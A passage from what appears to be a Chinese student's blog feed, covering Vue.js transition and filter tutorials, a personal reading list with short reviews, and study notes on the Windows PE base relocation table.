punctuation">"</span>add<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            <span class="token comment">&lt;!-- 在实现列表过渡的时候，如果需要过渡的元素，是通过 v-for 循环渲染出来的，不能使用 transition 包裹，需要使用 transitionGroup --></span>            <span class="token comment">&lt;!-- 如果要为 v-for 循环创建的元素设置动画，必须为每一个元素设置：key 属性 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transition-group</span> <span class="token attr-name">appear</span><span class="token punctuation">></span></span>                <span class="token comment">&lt;!-- 删除需要传入i --></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>(item, i) in list<span class="token punctuation">"</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item.id<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>del(i)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    &#123;&#123; item.id &#125;&#125; --- &#123;&#123; item.name &#125;&#125;                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>transition-group</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment">//这两个是为添加学号和姓名而设置的</span>            <span class="token literal-property property">list</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'张三'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'李四'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'王五'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'赵四'</span> <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">""</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token function">del</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 从 i 的地方删，删除一个</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅读清单</title>
      <link href="/2021/11/16/ge-lei-shu-ji-yue-du-qing-dan/"/>
      <url>/2021/11/16/ge-lei-shu-ji-yue-du-qing-dan/</url>
      
        <content type="html"><![CDATA[<h1 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h1><h2 id="财经类"><a href="#财经类" class="headerlink" title="财经类"></a>财经类</h2><ol><li>货币战争4 战国时代 宋鸿兵</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  货币战争4 战国时代 宋鸿兵</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116202829.png" alt="货币战争4 战国时代"></p><blockquote><p>从国际角度出发去阐述国际金融格局和现象，感觉需要很多的金融背景知识。印象比较深刻地是作者对于华为公司的预言，还有一些关于其他国家和我们国家经济政策的见地。比较深奥，还不是本人理解的。。。👻</p></blockquote></li></ul><ol start="2"><li>解读基金: 我的投资观与实践(修订版) 季凯帆</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  解读基金: 我的投资观与实践(修订版) 季凯帆</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116201850.png" alt="解读基金: 我的投资观与实践(修订版)"></p><blockquote><p>这本书主要是将作者本人是如何进行投资的，风险控制/基金组合/投资比例等等，主要是对投资基金的基础知识和常识进行了梳理。感觉我看完之后也没有记住多少东西。🙂</p></blockquote></li></ul><ol start="3"><li>货币 b站视频</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  货币 b站视频</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116203328.png" alt="货币"></p><blockquote><p>从历史的角度上分析，货币的由来/作用，对人类社会产生的影响，当今社会面临的货币问题等等。也不算很深奥。但是好像也没有说记住很多东西。。😔</p></blockquote></li></ul><ol start="4"><li>指数基金投资指南 银行螺丝钉</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  指数基金投资指南 银行螺丝钉</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116202410.png" alt="指数基金投资指南"></p><blockquote><p>我觉得这本书写的是比较清楚的，最起码在思路上比较明了。先给你一些建议，然后解释为什么选择指数基金？常见的指数基金的种类。之后是怎么挑选，采用什么方式买/以及用多少钱买等问题</p></blockquote></li></ul><h2 id="专业类"><a href="#专业类" class="headerlink" title="专业类"></a>专业类</h2><ol><li>汇编语言 王爽</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  汇编语言 王爽</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116203804.png" alt="汇编语言"></p><blockquote><p>这本书真的是写的非常好了，我一个不怎么看的下去的人，都是把整本书的练习和实验做完了。感觉收获真的是非常大，也解决了我之前在上课的时候产生的很多疑问。非常nice！🐮</p></blockquote></li></ul><ol start="2"><li>程序是怎样运行的</li></ol><ul><li><p><input checked="" disabled="" type="checkbox">  程序是怎样运行的</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211117185605.png" alt="程序是怎样运行的"></p><blockquote><p>这个我觉得收获也是蛮大的，写的也是比较通俗易懂。</p></blockquote></li></ul><ol start="3"><li>逆向工程 核心原理 李承远</li></ol><ul><li><p><input disabled="" type="checkbox">  逆向工程 核心原理 李承远</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116204238.png" alt="逆向工程 核心原理"></p><blockquote><p>本书里面的实验和讲解也是比较清楚的。思想很好，什么弄不懂，就边学边弄，慢慢就会了~~~😁</p></blockquote></li></ul><ol start="4"><li>Vue应用程序开发 </li></ol><ul><li><input disabled="" type="checkbox"> Vue应用程序开发 <blockquote><p>这不放图片了，反正网上一大堆。也基本上就是系统的浏览一下，好对Vue.js有个整体清晰地认识。</p></blockquote></li></ul><ol start="5"><li>Vue.js+Node.js全栈开发实践</li></ol><ul><li><input disabled="" type="checkbox"> Vue.js+Node.js全栈开发实践<blockquote><p>同上</p></blockquote></li></ul><h2 id="通识类"><a href="#通识类" class="headerlink" title="通识类"></a>通识类</h2><ol><li>零基础通识知识笔记 山形浩生</li></ol><ul><li><input disabled="" type="checkbox"> 零基础通识知识笔记 山形浩生  没找到图就不放了。。。<blockquote><p>写的比较有意思，上面的插画很通俗易懂。就是在这上面知道了商汤公司—做Al图象识别的。后来，还在和同学的谈话中听到了，他搞到了这个公司在上海总部的实习。~~~ 差距啊🚀</p></blockquote></li></ul><ol start="2"><li>幸福之路</li></ol><ul><li><p><input disabled="" type="checkbox">  幸福之路</p><p>  <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211203212843.png" alt="幸福之路"></p><blockquote><p>还没看完</p></blockquote></li></ul><h2 id="传记类"><a href="#传记类" class="headerlink" title="传记类"></a>传记类</h2><ol><li><p>知行合一: 王阳明传</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211217213559.png" alt="知行合一: 王阳明传"> </p><blockquote><p>这本书匆匆地看完，倒也没有对王阳明心学有什么很深刻的理解。更多的还是对于王阳明这个人的佩服吧，从小就知道自己的目标，有自己的主见。也确实经历了许多困难和磨砺，科举落选、遭刘瑾派人追杀、平定宁王朱宸濠叛乱有功却无实赏。 也正印证了那句话 <code>天将降大任与斯人也，必先苦其心智，劳其体肤，增益其所不能.</code> 关于他的作品和与人的对话印象比较深的是一句 <code>吾不以不及第为耻,吾以不及第动吾心为耻</code>, 自己看书可能很容易结合到自己的经历, 也不知道为什么, 每次会想起当初高考的失败, 心里总会有一种感激吧。倒不是因为复读的成功，更多的是因为自己心境的成长。 其实与王阳明的生死经历相对比，我经历的也不过是小巫见大巫吧。他太优秀了，以至于在他的那个年代，自己都显得格格不入。甚至我再想，如果他出生在我们这个年代，肯定也是院士级别人物吧。<code>吾心自有光明月 千古团圆永无缺</code>，希望先生的人格魅力能像明月一样，永远的照亮后人的心。</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-4-基址重定位表</title>
      <link href="/2021/11/16/ni-xiang-gong-cheng-he-xin-yuan-li-4-ji-zhi-chong-ding-wei-biao/"/>
      <url>/2021/11/16/ni-xiang-gong-cheng-he-xin-yuan-li-4-ji-zhi-chong-ding-wei-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h1><h2 id="PE重定位"><a href="#PE重定位" class="headerlink" title="PE重定位"></a>PE重定位</h2><p>PE重定位就是本来我要加载到内存中的位置被别人占了，所以我只能加载到其他地方，这一过程发生的一系列处理行为就是PE重定位。</p><h2 id="PE重定位时执行的操作"><a href="#PE重定位时执行的操作" class="headerlink" title="PE重定位时执行的操作"></a>PE重定位时执行的操作</h2><p>使硬编码在程序中的内存地址随着当前加载地址变化而变化的处理过程就是PE重定位。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116094935.png" alt="notepad的ImageBase"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116095015.png" alt="notepad的EP代码"></p><p>硬编码地址以ImageBase(01000000)为基准。生成构建notepad.exe文件时，由于无法预测程序被实际加载到哪个地址，所以记录硬编码地址时，以ImageBase为基准。但在运行的瞬间，经过PE重定位后，这些地址全部以加载地址为基准变换，使得最后程序得以正常进行。</p><p>上图中所有硬编码的地址都要根据加载地址的不同而变化。</p><h2 id="PE重定位操作的原理"><a href="#PE重定位操作的原理" class="headerlink" title="PE重定位操作的原理"></a>PE重定位操作的原理</h2><blockquote><p>在应用程序中查找硬编码的地址位置<br>读取值后，减去ImageBase(VA-&gt;RVA)<br>加上实际加载地址(RVA-&gt;VA)</p></blockquote><h3 id="基址重定位表-1"><a href="#基址重定位表-1" class="headerlink" title="基址重定位表"></a>基址重定位表</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116101030.png" alt="基址重定位表"></p><p>TypeOffset的低12位是真正的位移，该位移值基于Virtual Address的偏移。所以程序中使用硬编码地址的偏移使用下面等式换算。</p><p><strong>VirtualAddress(1000) + Offset(420) = 1420(RVA)</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116102150.png" alt="硬编码地址示例"></p><p>notepad.exe被加载到AF0000地址处。故<code>RVA 1420</code>即为<code>VA AF1420</code>，该地址处存储着IAT地址(VA,AF10C4<strong>指其调用函数地址的存放地址</strong>)。并且该值经过PE重定位而发生了变化。使用相同的原理，AF142D、AF1436地址的内容也都是硬编码到程序中的地址值，该偏移可以在重定位表中求得。</p><blockquote><p>TypeOffset项中指向位移的低12位拥有的最大地址值为1000.为了表示更大的地址，要添加1个与其对应的块，由于这些块以数组形式罗列，故称为重定位表<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116101231.png" alt="第二个块"></p></blockquote><h2 id="从可执行文件中删除-reloc节区"><a href="#从可执行文件中删除-reloc节区" class="headerlink" title="从可执行文件中删除.reloc节区"></a>从可执行文件中删除.reloc节区</h2><p>这个按照书上面操作之后显示不出来了，估计是版本更新之类的问题。</p><p>010Editor这个工具挺好用的</p><p>但是好像没没找到那种批量修改/填充的，就比如我想把某个地方全部填充为0，我还得一个一个的改。</p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-4-过滤器和自定义指令</title>
      <link href="/2021/11/15/vue-xue-xi-4-guo-lu-qi-he-zi-ding-yi-zhi-ling/"/>
      <url>/2021/11/15/vue-xue-xi-4-guo-lu-qi-he-zi-ding-yi-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="过滤器和自定义指令"><a href="#过滤器和自定义指令" class="headerlink" title="过滤器和自定义指令"></a>过滤器和自定义指令</h1><p>Vue.js过滤器本质上就是一个函数，其作用是在用户输入数据后，<strong>对数据进行处理</strong>–<code>处理成我们想要的样子</code>，并返回一个处理结果。</p><h2 id="过滤器的注册和使用"><a href="#过滤器的注册和使用" class="headerlink" title="过滤器的注册和使用"></a>过滤器的注册和使用</h2><p><strong>形式一–全局</strong>:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">v-model.number</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>val<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>   &#123;&#123;val|currencyDisplay&#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">   Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'currencyDisplay'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token string">'$'</span><span class="token operator">+</span>val<span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>     <span class="token literal-property property">val</span><span class="token operator">:</span><span class="token number">5.35353</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>形式二–局部</strong>:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>&#123;&#123; name | Upper &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>   <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>     <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'zhonghui'</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   <span class="token comment">// 声明一个本地的过滤器</span>   <span class="token literal-property property">filters</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">Upper</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>形式三–叠加</strong></p><p>filterA被定义为接受单个参数的过滤器函数，表达式message的值将作为参数传递到函数中。继续调用同样被定义为接受单个函数的过滤器函数filterB，便可将filterA的结果传递到filterB中。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&#123;&#123;message|filterA|filterB&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样也可以定义为接受多个参数的过滤器函数</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">   <span class="token selector">#app ul</span><span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> lavender<span class="token punctuation">;</span>    <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token selector">#app h2</span><span class="token punctuation">&#123;</span>    <span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token selector">.more</span><span class="token punctuation">&#123;</span>    <span class="token property">padding-left</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token selector">.more span</span><span class="token punctuation">&#123;</span>    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 65px<span 